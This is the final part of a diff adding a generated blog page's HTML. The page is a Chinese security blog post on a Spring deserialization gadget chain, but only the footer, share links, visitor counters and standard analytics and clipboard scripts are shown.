+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&name=Spring新入口类触发CC链&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jaspersec.top/2024/04/19/0x10%20Spring%E6%96%B0%E5%85%A5%E5%8F%A3%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91CC%E9%93%BE/&t=Spring新入口类触发CC链"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    Jasper_sec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+      <ul>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">
+          本站总访问量 <span id="busuanzi_value_site_pv"></span>次
+        </span>
+        <span id="busuanzi_container_site_uv">
+          本站访客数 <span id="busuanzi_value_site_uv"></span>人
+        </span>
+        <span id="busuanzi_container_page_uv">
+          本页访问量 <span id="busuanzi_value_page_pv"><!-- number will be auto injected here by busuanzi --></span>次
+        </span>
+      </ul>
+    </nav>
+  </div>
+
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?21e6754c7f372c2de41518ffb4f72c33";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
